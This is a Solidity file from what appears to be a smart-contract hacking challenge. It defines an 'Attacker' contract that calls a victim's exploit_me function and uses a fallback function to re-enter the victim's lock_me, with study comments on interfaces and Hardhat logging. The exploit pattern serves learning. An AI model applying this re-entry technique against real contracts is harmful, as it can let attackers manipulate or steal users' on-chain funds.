// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// The goal of this challenge is to be able to sign offchain a message
// with an address stored in winners.

/**
* Learning Modules:
*   1. Calling function from deployed contract (simulated abstact or castrated contract). Examples: 
*       https://ethereum.stackexchange.com/a/11481/3506 
*       https://blog.chain.link/smart-contract-call-another-smart-contract/
*       https://ethereum.stackexchange.com/a/66257/3506
*
*   2. Using Interfaces to call functions in deployed contract: 
*       
*       Example: https://ethereum.stackexchange.com/a/109533/3506
*
*       Interfaces are limited to what the Contract ABI can represent. The conversion  
*       between an ABI and an Interface should be possible without any information loss
*       Source: https://ethereum.stackexchange.com/a/42459/3506
* */

/** 
 * Console Logging uses gas, so remove from deployed contracts:
 *
 * https://hardhat.org/hardhat-network/docs/overview#console.log
 * https://hardhat.org/hardhat-runner/docs/getting-started#quick-start
 * https://hardhat.org/hardhat-network/docs/reference#console.log
 *
 * "console.log is implemented in standard Solidity and then detected in Hardhat Network. 
 *  This makes its compilation work with any other tools (like Remix, Waffle or Truffle).
 *  console.log calls can run in other networks, like mainnet, kovan, ropsten, etc. 
 *  They do nothing in those networks, but do spend a minimal amount of gas"
 */
import "hardhat/console.sol";


/**
 * This doesn't have to match the real contract name. Call it what you like.
 * NB: The deployed contract is called 'Victim'
 */
interface VictimContract{ 
    // No implementation, just the function signature. 
    // If declared as `contract` or `abstract contract`, you should include original's visibilty specifiers
    // If declared as `interface`, visibility must be `external`
    // Like an ABI, it tells Solidity can work out how to call it
    function exploit_me(address winner) external;// public{} //public function specified here as 'external' 
    function lock_me() external;// public{} /public function specified here as 'external' 
}

contract Attacker{

    VictimContract public target;

    address public user;

    constructor(address _targetAddress ) {
       target = VictimContract(_targetAddress);
    }


    function addWinner(address _user) public payable{

        console.log("Calling addWinner inside attacker contract");
        console.log("Address Of Attack Contract:  %s ", address(this));
        console.log("Address Of End User: %s ", msg.sender);

        user = _user;

        target.exploit_me( _user);

    }

// The fallback function is run if the data sent does not start with a known function identifier 
// (e.g. if a non-existent function is called or if the message data is empty as is the case for
// a simple ether transfer). https://ethereum.stackexchange.com/a/1534/3506
    fallback() external {  //method call sequence will continue where it left off from addWinner
    
        console.log("Calling Failover");

        target.lock_me(); 
    
        
    }


}